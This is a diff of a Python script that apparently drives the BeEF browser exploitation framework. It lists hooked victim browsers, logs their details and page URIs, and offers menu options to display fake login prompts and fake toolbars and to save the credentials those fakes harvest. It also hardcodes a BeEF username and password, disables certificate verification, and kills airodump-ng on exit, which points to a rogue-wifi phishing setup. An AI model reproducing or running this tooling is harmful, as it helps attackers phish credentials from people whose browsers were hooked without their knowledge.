@@ -14,8 +14,8 @@ class Browser_Parser:
 		self.browser_db_router= Browser_DB_Router(self.user_id)
 		self.uname = "beef"
 		self.pword = "eaterGin308"
-		self.cert_key = "/opt/beef/beef_key.pem"
-		self.cert_cert = "/opt/beef/beef_cert.pem"
+		self.cert_key = "/opt/beef/beefFramework-key.pem"
+		self.cert_cert = "/opt/beef/beefFramework.pem"
 		self.redirect_url = 'https://192.168.3.1/sheep.jpg'
 		self.browser_id = None
 		self.cert = (self.cert_cert, self.cert_key)
@@ -154,7 +154,7 @@ class Browser_Parser:
 			pprint.pprint(hooked_browsers)
 			print "browser session id: " + str(browser_id)
 			self.browser_id = browser_id
-			self.browser_db_router.update_BrowserTable_Session_id(self.user_id, self.browser_id)
+			self.browser_db_router.update_BrowserTable_Session_id(self.user_id, self.browser_id, self.redirect_uri)
 			return self.get_browser_deets(self.browser_id)
 		else:
 			print "no hooked browser found"
@@ -165,7 +165,7 @@ class Browser_Parser:
 		k_une = requests.get(url=urll, cert=self.cert, verify=False)
 		k_dict = json.loads(k_une.text)
 		pprint.pprint(k_dict)
-		self.browser_db_router.insert_into_BrowserTable(self.user_id, browser_id, k_dict['BrowserReportedName'], k_dict['BrowserVersion'], k_dict['OsName'], k_dict['BrowserPlugins'], self.browser_id, '0', '0')
+		self.browser_db_router.insert_into_BrowserTable(self.user_id, browser_id, k_dict['BrowserReportedName'], k_dict['BrowserVersion'], k_dict['OsName'], k_dict['BrowserPlugins'], self.browser_id, '0', '0', k_dict['PageURI'])
 
 
 	def get_module_deets(self):
@@ -205,9 +205,7 @@ class Browser_Parser:
 							"3.Display fake toolbar\n"\
 							"4.Save fake login results\n"\
 							"5.Save fake toolbar results\n"\
-							"6.Check for LastPass\n"\
-							"7.Check for installed toolbars\n"\
-							"8.Exit\n")
+							"6.Exit\n")
 			try:
 				resp = int(resp)
 			except ValueError:
@@ -235,9 +233,10 @@ class Browser_Parser:
 		elif resp == 5:
 			self.get_toolbar_result()
 			self.menu()
-		elif resp == 8:
+		elif resp == 6:
 			os.system("sudo pkill airodump-ng && sudo pkill python") 
 			sys.exit(0)
 
 if __name__ == "__main__":
 	bp = Browser_Parser()
+
